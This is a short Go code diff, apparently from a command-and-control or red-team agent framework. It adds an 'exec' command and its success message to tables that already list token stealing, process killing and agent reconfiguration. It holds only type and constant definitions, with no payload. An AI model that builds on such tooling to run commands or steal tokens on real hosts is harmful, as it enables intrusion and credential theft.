@@ -271,6 +271,11 @@ type FileOutput struct {
 	Data    []byte
 }
 
+type Param struct {
+	Value    any    `json:"param"`
+	DataType string `json:"type"`
+}
+
 var SuccessMap = map[uint32]string{
 	// custom success below
 	488: "CP_SUCCESS: Succesfully copied files",
@@ -283,6 +288,7 @@ var SuccessMap = map[uint32]string{
 	495: "RECONFIG_DONE: Succesfully updated agent config",
 	496: "KILL_SUCCESS: Succesfully terminated process",
 	497: "STEAL_SUCCESS: Succesfully Stole token",
+	498: "EXEC_SUCCESS: Succesfully Executed Process",
 }
 
 type ClientRegister struct {
@@ -389,4 +395,5 @@ var CmdNames = map[int]string{
 	14: "reconfig",
 	15: "proc kill",
 	16: "token steal",
+	17: "exec",
 }
